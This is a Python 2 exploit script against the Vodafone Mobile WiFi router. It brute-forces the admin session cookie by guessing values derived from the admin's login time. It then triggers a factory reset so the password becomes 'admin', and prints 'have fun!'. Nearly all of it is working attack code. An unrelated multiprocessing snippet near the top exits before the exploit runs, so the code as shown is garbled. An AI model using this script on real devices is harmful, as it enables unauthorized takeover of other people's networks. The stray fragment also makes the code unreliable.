import urllib2
import json
from datetime import datetime, timedelta
import time
import httplib
from threading import Thread
from Queue import Queue
from multiprocessing import process


print """
Vodafone Mobile WiFi - Password reset exploit (Daniele Linguaglossa)
"""
thread_lock = False
session = ""
def unix_time_millis(dt):
    epoch = datetime.utcfromtimestamp(0)
    return int(((dt - epoch).total_seconds() * 1000.0) / 1000)

a=False

def check_process_output():
    print 1

p = process.Process(target=check_process_output)
p.start()

print a
exit(0)

def crack(queue):
    global thread_lock
    global session
    while True:
        if thread_lock:
            exit(0)
        if not queue.empty():
            cookie = queue.get()
            headers = {'Referer': 'http://192.168.0.1/home.htm', 'Cookie': "stok=%s" % cookie}
            req = urllib2.Request("http://192.168.0.1/goform/goform_get_cmd_process?cmd=AuthMode&_=%s"
                                          % time.time(), None, headers)
            result = urllib2.urlopen(req).read()
            if json.loads(result)["AuthMode"] != "":
                print "[+] Found valid admin session!"
                print "[INFO] Terminating other threads ... please wait"
                session = cookie
                queue.task_done()
                thread_lock = True


def start_threads_with_args(target, n, arg):
    thread_pool = []
    for n_threads in range(0, n):
        thread = Thread(target=target, args=(arg,))
        thread_pool.append(thread)
        thread_pool[-1].start()
    return thread_pool

def start_bruteforce():
    global session
    global thread_lock
    queue = Queue(0)
    start_threads_with_args(crack, 15, queue)
    print"[!] Trying fast bruteforce..."
    for x in range(0, 1000):
        if thread_lock:
            break
        queue.put("123abc456def789%03d" % x)
    while True:
        if session != "":
            return session
        if queue.empty():
            break
    print "[!] Trying slow bruteforce..."
    for milliseconds in range(0, how_many):
        if thread_lock:
            break
        queue.put("123abc456def789%s" % (start + milliseconds))
    while True:
        if session != "":
            return session
        if queue.empty():
            break
    return session
if __name__ == "__main__":
    now = datetime.now()
    hours = raw_input("How many hours ago admin logged in: ")
    minutes = raw_input("How many minutes ago admin logged in: ")
    init = datetime(now.year, now.month, now.day, now.hour, now.minute) - timedelta(hours=int(hours), minutes=int(minutes))
    end = datetime(now.year, now.month, now.day, 23, 59, 59, 999999)
    start = unix_time_millis(init)
    how_many = unix_time_millis(end) - start + 1
    print "[+] Starting session bruteforce with 15 threads"
    valid_session = ""
    try:
        valid_session = start_bruteforce()
    except KeyboardInterrupt:
        print "[-] Exiting.."
        thread_lock = True
        exit(0)
    if valid_session == "":
        print "[!] Can't find valid session :( quitting..."
        exit(0)
    print "[+] Resetting router password to 'admin' , network may be down for a while"
    headers = {'Referer': 'http://192.168.0.1/home.htm', 'Cookie': "stok=%s" % valid_session}
    req = urllib2.Request("http://192.168.0.1/goform/goform_set_cmd_process",
                          "goformId=RESTORE_FACTORY_SETTINGS&_=%s" % time.time(), headers)
    try:
        urllib2.urlopen(req).read()
    except httplib.BadStatusLine:
        print "[!] Password resetted to admin! have fun!"
        exit(0)
    except Exception:
        print "[x] Error during password reset"
    print "[-] Can't reset password try manually, your session is: %s" % valid_session